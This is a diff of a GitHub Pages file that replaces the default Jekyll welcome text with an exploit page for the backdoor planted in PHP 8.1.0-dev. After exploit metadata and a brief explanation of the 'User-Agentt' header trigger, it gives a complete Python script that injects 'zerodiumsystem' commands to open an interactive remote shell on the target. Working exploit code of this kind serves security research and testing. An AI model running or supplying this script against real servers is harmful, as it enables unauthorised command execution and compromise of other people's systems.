@@ -1,37 +1,84 @@
-## Welcome to GitHub Pages
+_[<-- Home](https://flast101.github.io)_
 
-You can use the [editor on GitHub](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/edit/main/docs/index.md) to maintain and preview the content for your website in Markdown files.
+# PHP 8.1.0-dev Backdoor Remote Command Execution
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
 
-### Markdown
+![docs/logo_php8.svg](docs/logo_php8.svg "docs/logo_php8.svg")
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
 
-```markdown
-Syntax highlighted code block
 
-# Header 1
-## Header 2
-### Header 3
+* * * 
 
-- Bulleted
-- List
+## POC Script
 
-1. Numbered
-2. List
+Exploit Title: PHP 8.1.0-dev Backdoor Remote Command Execution
+Date: 23 may 2021
+Exploit Author: flast101
+Vendor Homepage: https://www.php.net/
+Software Link: 
+- https://hub.docker.com/r/phpdaily/php
+- https://github.com/phpdaily/php
+Version: 8.1.0-dev
+Tested on: 8.1.0-dev
+CVE : N/A
+Previous vulnerability references:
+- https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
+- https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md
 
-**Bold** and _Italic_ and `Code` text
 
-[Link](url) and ![Image](src)
+An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
+
+The following exploit uses the backdoor to provide a pseudo system shell on the host.
+
+
+```python
+#!/usr/bin/env python3
+import os
+import re
+import requests
+
+host = input("Enter the full host url:\n")
+request = requests.Session()
+response = request.get(host)
+
+if str(response) == '<Response [200]>':
+    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
+    try:
+        while 1:
+            cmd = input("$ ")
+            headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+            "User-Agentt": "zerodiumsystem('" + cmd + "');"
+            }
+            response = request.get(host, headers = headers, allow_redirects = False)
+            current_page = response.text
+            stdout = current_page.split('<!DOCTYPE html>',1)
+            text = print(stdout[0])
+    except KeyboardInterrupt:
+        print("Exiting...")
+        exit
+
+else:
+    print("\r")
+    print(response)
+    print("Host is not available, aborting...")
+    exit
 ```
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+Be Curious, Learning is Life !
 
-### Jekyll Themes
+_[<-- Home](https://flast101.github.io)_
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
 
-### Support or Contact
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-173692234-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-173692234-1');
+</script>
+
